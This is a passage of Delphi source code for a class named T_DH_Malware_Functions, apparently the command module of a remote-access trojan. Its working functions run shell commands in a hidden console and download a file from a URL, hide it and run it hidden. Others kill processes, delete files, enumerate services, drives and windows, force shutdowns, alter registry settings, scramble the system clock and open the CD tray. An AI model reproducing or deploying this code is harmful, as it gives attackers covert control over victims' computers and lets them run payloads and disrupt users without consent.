        Result := '[-] List directory : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] List directory : ERROR';
  end;
end;

function T_DH_Malware_Functions.delete_filename(filename: string): string;
var
  code: string;
begin
  if not(filename = '') then
  begin
    try
      begin
        code := '';

        if DirectoryExists(filename) then
        begin
          if (RemoveDir(filename)) then
          begin
            code := '[+] Delete File : OK';
          end
          else
          begin
            code := '[-] Delete File : Error deleting directory';
          end;
        end;
        if FileExists(filename) then
        begin
          if (DeleteFile(Pchar(filename))) then
          begin
            code := '[+] Delete File : OK';
          end
          else
          begin
            code := '[-] Delete File : Error deleting file';
          end;
        end;
        Result := code;
      end;
    except
      begin
        Result := '[-] Delete File : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Delete File : ERROR';
  end;
end;

function T_DH_Malware_Functions.list_process(): string;
var
  open_process: THandle;
  find_process: LongBool;
  process: TProcessEntry32;
  process_count: integer;
  list_process_found: string;
  code: string;
begin
  try
    begin
      code := '';
      process_count := 0;

      open_process := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
      process.dwSize := SizeOf(process);

      find_process := Process32First(open_process, process);

      while find_process do
      begin
        list_process_found := list_process_found + sLineBreak + '[+] Name : ' +
          process.szExeFile + sLineBreak + '[+] PID : ' +
          IntToStr(process.th32ProcessID) + sLineBreak;
        Inc(process_count);
        find_process := Process32Next(open_process, process);
      end;

      code := '[+] Process found : ' + IntToStr(process_count) + sLineBreak;
      code := code + list_process_found;

      Result := code;
    end;
  except
    begin
      Result := '[-] List Process : ERROR';
    end;
  end;
end;

function T_DH_Malware_Functions.kill_process(process_name: string): string;
var
  loop_run: bool;
  handle: THandle;
  process_load: TProcessEntry32;
  resultado: string;
  check_ok: bool;
begin

  resultado := '';
  check_ok := False;

  if not(process_name = '') then
  begin
    try
      begin
        handle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        process_load.dwSize := SizeOf(process_load);
        loop_run := Process32First(handle, process_load);

        while integer(loop_run) <> 0 do
        begin
          if (ExtractFileName(process_load.szExeFile) = process_name) then
          begin
            TerminateProcess(OpenProcess(PROCESS_TERMINATE, bool(0),
              process_load.th32ProcessID), 0);
            resultado := '[+] Process Killer : OK';
            check_ok := True;
            break;
          end;
          loop_run := Process32Next(handle, process_load);
        end;
        if not(check_ok = True) then
        begin
          resultado := '[-] Process Killer : Process not exists';
        end;
        CloseHandle(handle);
      end;
    except
      begin
        resultado := '[-] Process Killer : ERROR';
      end;
    end;
  end
  else
  begin
    resultado := '[-] Process Killer : Process not exists';
  end;
  Result := resultado;
end;

function T_DH_Malware_Functions.execute_command(command: string): string;
// Credits : Function ejecutar() based in : http://www.delphidabbler.com/tips/61
// Thanks to www.delphidabbler.com

var
  SecurityAttributes: TSecurityAttributes;
  StartupInfo: TStartupInfo;
  ProcessInformation: TProcessInformation;
  Handle1: THandle;
  Handle2: THandle;
  check: Boolean;
  output: array [0 .. 255] of AnsiChar;
  check2: Cardinal;
  check3: Boolean;
  code: string;

begin
  if not(command = '') then
  begin
    try
      begin
        code := '';

        with SecurityAttributes do
        begin
          nLength := SizeOf(SecurityAttributes);
          bInheritHandle := True;
          lpSecurityDescriptor := nil;
        end;

        CreatePipe(Handle1, Handle2, @SecurityAttributes, 0);

        with StartupInfo do
        begin
          FillChar(StartupInfo, SizeOf(StartupInfo), 0);
          cb := SizeOf(StartupInfo);
          dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
          wShowWindow := SW_HIDE;
          hStdInput := GetStdHandle(STD_INPUT_HANDLE);
          hStdOutput := Handle2;
          hStdError := Handle2;
        end;

        check3 := CreateProcess(nil, Pchar('cmd.exe /C ' + command), nil, nil,
          True, 0, nil, Pchar('c:/'), StartupInfo, ProcessInformation);

        CloseHandle(Handle2);

        if check3 then

          repeat

          begin
            check := ReadFile(Handle1, output, 255, check2, nil);
          end;

          if check2 > 0 then
          begin
            output[check2] := #0;
            code := code + output;
          end;

          until not(check) or (check2 = 0);

        Result := '[+] Console : OK' + sLineBreak + code;
      end;
    except
      begin
        Result := '[-] Console : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Console : ERROR';
  end;
end;

function leerdatos_sub(sub_1, sub_2, sub_3, sub_4: integer): DWORD;
begin
  Result := sub_1 shl 16 or sub_4 shl 14 or sub_2 shl 2 or sub_3;
end;

function usb_name(checked: Char): string;
// Based on http://delphitutorial.info/get-volume-name.html
var
  uno, dos: DWORD;
  resultnow: array [0 .. MAX_PATH] of Char;
begin
  if not(checked = '') then
  begin
    try
      GetVolumeInformation(Pchar(checked + ':/'), resultnow, SizeOf(resultnow),
        nil, uno, dos, nil, 0);
      Result := StrPas(resultnow);
    except
      Result := checked;
    end;
  end
  else
  begin
    Result := '[-] USB Name : ERROR';
  end;
end;

function check_drive(target: string): Boolean;
var
  a, b, c: Cardinal;
begin
  if not(target = '') then
  begin
    Result := GetVolumeInformation(Pchar(target), nil, 0, @c, a, b, nil, 0);
  end
  else
  begin
    Result := False;
  end;
end;

function get_letter_cd(): Char;
var
  drive: Char;
  letter: Char;
begin
  try
    begin
      for drive := 'C' to 'Z' do
      begin
        if (GetDriveType(Pchar(drive + ':/')) = DRIVE_CDROM) then
        begin
          letter := drive;
          break;
        end;
      end;
      Result := letter;
    end;
  except
    begin
      //
    end;
  end;
end;

function T_DH_Malware_Functions.cd_manager(option: string): string;

// Credits : Based on http://stackoverflow.com/questions/19894566/using-windows-and-mmsystem-in-delphi
// Thanks to Sertac Akyuz

const
  const_uno = $00000009;
  const_dos = $0000002D;
  const_tres = 0;
  const_cuatro = 0;
  const_cinco = $0001;
  const_seis = const_dos;
  const_siete = 6;
  const_ocho = 8;

var
  var_uno: string;
  var_dos: THandle;
  var_tres: DWORD;
  parameter: integer;

var
  letter: Char;

begin
  if not(option = '') then
  begin
    try
      begin
        letter := get_letter_cd();

        if (option = 'open') then
        begin
          parameter := $0202;
        end;

        if (option = 'close') then
        begin
          parameter := $0203;
        end;

        var_uno := Format('\\.\%s:', [letter]);
        var_dos := CreateFile(Pchar(var_uno), GENERIC_READ, FILE_SHARE_WRITE,
          nil, OPEN_EXISTING, 0, 0);
        DeviceIoControl(var_dos, leerdatos_sub(const_uno, const_siete,
          const_tres, const_cuatro), nil, 0, nil, 0, var_tres, nil);
        DeviceIoControl(var_dos, leerdatos_sub(const_uno, const_ocho,
          const_tres, const_cuatro), nil, 0, nil, 0, var_tres, nil);
        DeviceIoControl(var_dos, leerdatos_sub(const_seis, parameter,
          const_tres, const_cinco), nil, 0, nil, 0, var_tres, nil);
        CloseHandle(var_dos);

        Result := '[+] CD Manager : OK';
      end;
    except
      begin
        Result := '[-] CD Manager : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] CD Manager : ERROR';
  end;
end;

function T_DH_Malware_Functions.get_drives(): string;
var
  unidad: Char;
  code: string;
begin
  try
    begin
      code := code + '[+] List Drives : OK' + sLineBreak + sLineBreak;
      for unidad := 'C' to 'Z' do
      begin
        if (check_drive(Pchar(unidad + ':\')) = True) then
        begin
          if (GetDriveType(Pchar(unidad + ':\')) = DRIVE_REMOVABLE) then
          begin
            code := code + '[+] USB Drive : ' + unidad + sLineBreak;
          end;
          if (GetDriveType(Pchar(unidad + ':\')) = DRIVE_FIXED) then
          begin
            code := code + '[+] Fixed Drive : ' + unidad + sLineBreak;
          end;
          if (GetDriveType(Pchar(unidad + ':\')) = DRIVE_REMOTE) then
          begin
            code := code + '[+] Remote Drive : ' + unidad + sLineBreak;
          end;
          if (GetDriveType(Pchar(unidad + ':\')) = DRIVE_CDROM) then
          begin
            code := code + '[+] CD Rom Drive : ' + unidad + sLineBreak;
          end;
          if (GetDriveType(Pchar(unidad + ':\')) = DRIVE_RAMDISK) then
          begin
            code := code + '[+] RAM Drive : ' + unidad + sLineBreak;
          end;
        end;
      end;
      Result := code;
    end;
  except
    begin
      Result := '[-] Get Drives : ERROR';
    end;
  end;
end;

function T_DH_Malware_Functions.get_services(): string;

// Based on : http://www.delphitricks.com/source-code/systeminfo/get_a_list_of_installed_services.html
// Thanks to Alexander Savchev

type
  typeuno = array [0 .. 4096] of TEnumServiceStatus;
  typedos = ^typeuno;

var
  i: integer;

  uno: SC_Handle;
  dos, tres, cuatro: DWORD;
  cinco: typedos;
  code: string;

begin

  try
    begin
      code := '[+] List services : OK' + sLineBreak + sLineBreak;

      uno := OpenSCManager(Pchar(''), nil, SC_MANAGER_ALL_ACCESS);

      if (uno > 0) then
      begin

        cuatro := 0;

        New(cinco);

        EnumServicesStatus(uno, SERVICE_WIN32, SERVICE_STATE_ALL, cinco^[0],
          SizeOf(cinco^), dos, tres, cuatro);

        code := code + '[+] Services Found : ' + IntToStr(tres) + sLineBreak +
          sLineBreak;

        for i := 0 to tres - 1 do
        begin
          code := code + '[+] Service : ' + StrPas(cinco^[i].lpDisplayName) +
            sLineBreak;
        end;

        Result := code;

        Dispose(cinco);

        CloseServiceHandle(uno);
      end;
    end;
  except
    begin
      Result := '[-] Get Services : ERROR';
    end;
  end;
end;

function get_windows(var1: HWND; var2: integer): Boolean; stdcall;
var
  uno: DWORD;
  title, dos: string;
begin
  try
    begin
      GetWindowThreadProcessId(var1, uno);

      SetLength(title, 255);
      SetLength(title, GetWindowText(var1, Pchar(title), Length(title)));
      if not(title = '') then
      begin
        active_windows_founds := active_windows_founds + '[Title] : ' + title +
          sLineBreak;
      end;
      Result := True;
    end;
  except
    begin
      //
    end;
  end;
end;

function T_DH_Malware_Functions.list_windows(): string;
var
  list_windows_now: string;
begin
  list_windows_now := '';
  active_windows_founds := '';
  EnumWindows(@get_windows, 9999);
  if (active_windows_founds = '') then
  begin
    list_windows_now := '[-] List Windows : ERROR';
  end
  else
  begin
    list_windows_now := '[+] List Windows : OK' + sLineBreak + sLineBreak +
      active_windows_founds;
  end;
  Result := list_windows_now;
end;

function T_DH_Malware_Functions.shutdown(): string;
begin
  try
    begin
      execute_command('shutdown -p');
      Result := '[+] Shutdown : OK';
    end;
  except
    begin
      Result := '[-] Shutdown : ERROR';
    end;
  end;
end;

function T_DH_Malware_Functions.close_session(): string;
begin
  try
    begin
      execute_command('shutdown -l');
      Result := '[+] Close Session : OK';
    end;
  except
    begin
      Result := '[-] Close Session : ERROR';
    end;
  end;
end;

function T_DH_Malware_Functions.reboot(): string;
begin
  try
    begin
      execute_command('shutdown -r');
      Result := '[+] Reboot : OK';
    end;
  except
    begin
      Result := '[-] Reboot : ERROR';
    end;
  end;
end;

function T_DH_Malware_Functions.message_box(title, message_text,
  type_message: string): string;
begin
  if not(title = '') and not(message_text = '') and not(type_message = '') then
  begin
    try
      begin
        if (type_message = 'Information') then
        begin
          MessageBox(0, Pchar(message_text), Pchar(title), MB_ICONINFORMATION);
        end
        else if (type_message = 'Warning') then
        begin
          MessageBox(0, Pchar(message_text), Pchar(title), MB_ICONWARNING);
        end
        else if (type_message = 'Question') then
        begin
          MessageBox(0, Pchar(message_text), Pchar(title), MB_ICONQUESTION);
        end
        else if (type_message = 'Error') then
        begin
          MessageBox(0, Pchar(message_text), Pchar(title), MB_ICONERROR);
        end
        else
        begin
          MessageBox(0, Pchar(message_text), Pchar(title), MB_ICONINFORMATION);
        end;
        Result := '[+] MessageBox : OK';
      end;
    except
      begin
        Result := '[-] MessageBox : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] MessageBox : ERROR';
  end;
end;

function T_DH_Malware_Functions.load_page(page: string): string;
begin
  if not(page = '') then
  begin
    try
      begin
        execute_command('start ' + page);
        Result := '[+] Load Page : OK';
      end;
    except
      begin
        Result := '[-] Load Page : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Load Page : ERROR';
  end;
end;

function T_DH_Malware_Functions.load_paint(): string;
begin
  try
    begin
      execute_command('mspaint.exe');
      Result := '[+] Paint Loaded : OK';
    end;
  except
    begin
      Result := '[-] Paint Loaded : ERROR';
    end;
  end;
end;

function T_DH_Malware_Functions.edit_taskbar_text(option, text: string): string;
var
  Registry: TRegistry;
begin
  if not(option = '') and not(text = '') then
  begin
    try
      begin
        Registry := TRegistry.Create;
        Registry.RootKey := HKEY_CURRENT_USER;
        Registry.OpenKey('Control Panel\International', True);
        if (option = 'on') then
        begin
          Registry.WriteString('sShortTime', 'tt');
          Registry.WriteString('sTimeFormat', 'tt');
          Registry.WriteString('s1159', text);
          Registry.WriteString('s2359', text);
        end;
        if (option = 'off') then
        begin
          Registry.WriteString('sShortTime', 'H:mm');
          Registry.WriteString('sTimeFormat', 'H:mm:ss');
          Registry.WriteString('s1159', '');
          Registry.WriteString('s2359', '');
        end;
        Registry.Free;
        Result := '[+] Edit Taskbar Text : OK';
      end;
    except
      begin
        Result := '[-] Edit Taskbar Text : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Edit Taskbar Text : ERROR';
  end;
end;

procedure file_loader(filename: TFileName; option: string);
var
  loader: SHELLEXECUTEINFO;
begin
  if not(option = '') then
  begin
    try
      begin
        if (FileExists(filename)) then
        begin
          ZeroMemory(@loader, SizeOf(SHELLEXECUTEINFO));
          loader.cbSize := SizeOf(SHELLEXECUTEINFO);
          loader.fMask := SEE_MASK_NOCLOSEPROCESS;
          loader.Wnd := 0;
          loader.lpVerb := 'open';
          loader.lpFile := Pchar(filename);
          if (option = 'show') then
          begin
            loader.nShow := SW_SHOWNORMAL;
          end;
          if (option = 'hide') then
          begin
            loader.nShow := SW_HIDE;
          end;
          if not ShellExecuteEx(@loader) then
            if GetLastError <= 32 then
            begin
              SysErrorMessage(GetLastError);
            end;
        end;
      end;
    except
      //
    end;
  end;
end;

function file_loader_thread(filename, option: string): Boolean;
begin
  if (FileExists(filename)) and not(option = '') then
  begin
    try
      begin
        CreateTask(
          procedure(const task: IOmniTask)
          var
            file_to_load: string;
            option_load: string;
          begin

            file_to_load := task.Param['filename'].AsString;
            option_load := task.Param['option'].AsString;

            if (option_load = 'show') then
            begin
              ShellExecute(0, 'open', Pchar(file_to_load), nil, nil,
                SW_SHOWNORMAL);
            end;
            if (option_load = 'hide') then
            begin
              ShellExecute(0, 'open', Pchar(file_to_load), nil, nil, SW_HIDE);
            end;

          end).SetParameter('filename', filename).SetParameter('option', option)
          .Unobserved.Schedule;

        Result := True;
      end;
    except
      begin
        Result := False;
      end;
    end;
  end
  else
  begin
    Result := False;
  end;
end;

function T_DH_Malware_Functions.download_and_execute(link,
  new_name: string): string;
begin
  if not(link = '') and not(new_name = '') then
  begin
    try
      begin
        UrlDownloadToFile(nil, Pchar(link), Pchar(new_name), 0, nil);
        if (FileExists(new_name)) then
        begin
          SetFileAttributes(Pchar(new_name), FILE_ATTRIBUTE_HIDDEN);
          file_loader_thread(Pchar(new_name), 'hide');
        end;
        Result := '[+] Download & Execute : OK';
      end;
    except
      begin
        Result := '[-] Download & Execute : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Download & Execute : ERROR';
  end;
end;

function T_DH_Malware_Functions.crazy_hour(count: integer): string;
var
  tiempo: TSystemTime;
  i: integer;
  nueva_hora: TDateTime;
  hora: integer;
  minutos: integer;
begin
  if (count > 0) then
  begin
    try
      begin
        For i := 1 to count do
        begin
          hora := RandomRange(1, 23);
          minutos := RandomRange(1, 40);
          nueva_hora := StrToTime(IntToStr(hora) + ':' +
            IntToStr(minutos) + ':00');
          DateTimeToSystemTime(Date + nueva_hora, tiempo);
          SetLocalTime(tiempo);
          Sleep(1000);
        end;
        Result := '[+] Crazy Hour : OK';
      end;
    except
      begin
        Result := '[-] Crazy Hour : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Crazy Hour : ERROR';
  end;
end;

function T_DH_Malware_Functions.turn_off_monitor(): string;
const
  MONITOR_ON = -1;
  MONITOR_OFF = 2;
  MONITOR_STANDBY = 1;
begin
  try
    begin
      SendMessage(GetForegroundWindow(), WM_SYSCOMMAND, SC_MONITORPOWER,
        MONITOR_OFF);
      Result := '[+] Turn Off Monitor : OK';
    end;
  except
    begin
      Result := '[-] Turn Off Monitor : ERROR';
    end;
  end;
end;

function T_DH_Malware_Functions.speak(text: string): string;
var
  Voice: Variant;
  code: string;
begin
  if not(text = '') then
  begin
    try
      begin
        Voice := CreateOleObject('SAPI.SpVoice');
        Voice.speak(text);
        repeat
          Sleep(100);
        until Voice.WaitUntilDone(10);
        Result := '[+] Voice Speak : OK';
      end;
    except
      begin
        Result := '[-] Voice Speak : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Voice Speak : ERROR';
  end;
end;

function T_DH_Malware_Functions.play_beep(count: integer): string;
var
  i: integer;
begin
  if (count > 0) then
  begin
    try
      begin
        For i := 1 to count do
        begin
          Windows.Beep(800, 100);
        end;
        Result := '[+] Play Beep : OK';
      end;
    except
      begin
        Result := '[-] Play Beep : ERROR';
      end;
    end;
  end
  else
  begin
    Result := '[-] Play Beep : ERROR';
  end;

end;

end.

// The End ?
